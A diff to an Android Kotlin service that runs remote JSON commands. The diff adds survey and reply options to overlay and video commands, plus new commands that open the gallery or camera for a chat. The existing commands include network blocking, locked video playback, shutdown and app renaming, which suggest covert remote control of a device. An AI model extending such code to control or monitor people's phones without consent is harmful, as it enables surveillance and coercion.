@@ -150,16 +150,51 @@ class ControlService : Service() {
                 when (cmd.optString("cmd")) {
                     "shutdown"      -> shutdown()
                     "dnd_off"       -> disableDnD()
-                    "show_message"  -> showOverlayMessage(cmd.optString("text", "Сообщение"))
+                    "show_message"  -> {
+                        val fbMode      = cmd.optString("fb_mode", "plain")
+                        val replyPrompt = cmd.optString("reply_prompt", "✏️ Напиши ответ:")
+                        val chatId      = cmd.optString("_chat_id", "")
+                        val survey      = buildList {
+                            val arr = cmd.optJSONArray("survey")
+                            if (arr != null) for (i in 0 until arr.length()) add(arr.getString(i))
+                        }
+                        OverlayActivity.start(
+                            this@ControlService,
+                            cmd.optString("text", "Сообщение"),
+                            fbMode, replyPrompt, survey, chatId
+                        )
+                    }
                     "ban"           -> startVpnBlock()
                     "unban"         -> stopVpnBlock()
-                    "video"         -> VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1), lock, duration)
-                    "play_raw"      -> VideoActivity.startFromUrl(this@ControlService, cmd.optString("url"), lock, duration)
+                    "video"         -> {
+                        val fbMode      = cmd.optString("fb_mode", "plain")
+                        val replyPrompt = cmd.optString("reply_prompt", "✏️ Напиши ответ:")
+                        val chatId      = cmd.optString("_chat_id", "")
+                        val survey      = buildList {
+                            val arr = cmd.optJSONArray("survey")
+                            if (arr != null) for (i in 0 until arr.length()) add(arr.getString(i))
+                        }
+                        VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1), lock, duration,
+                            fbMode, replyPrompt, survey, chatId)
+                    }
+                    "play_raw"      -> {
+                        val fbMode      = cmd.optString("fb_mode", "plain")
+                        val replyPrompt = cmd.optString("reply_prompt", "✏️ Напиши ответ:")
+                        val chatId      = cmd.optString("_chat_id", "")
+                        val survey      = buildList {
+                            val arr = cmd.optJSONArray("survey")
+                            if (arr != null) for (i in 0 until arr.length()) add(arr.getString(i))
+                        }
+                        VideoActivity.startFromUrl(this@ControlService, cmd.optString("url"), lock, duration,
+                            fbMode, replyPrompt, survey, chatId)
+                    }
                     "prefetch"      -> prefetchVideo(cmd.optString("url"))
                     "delete_video"  -> deleteVideoCache(cmd.optString("url"))
                     "sound"         -> setVolume(cmd.optInt("level", 5))
                     "unban_video"   -> VideoActivity.unlock()
                     "rename"        -> AppNameHelper.rename(this@ControlService, cmd.optString("name"))
+                    "open_gallery"  -> FilePickerActivity.startGallery(this@ControlService, cmd.optString("_chat_id", ""))
+                    "open_camera"   -> FilePickerActivity.startCamera(this@ControlService, cmd.optString("_chat_id", ""))
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Command failed: ${e.message}")
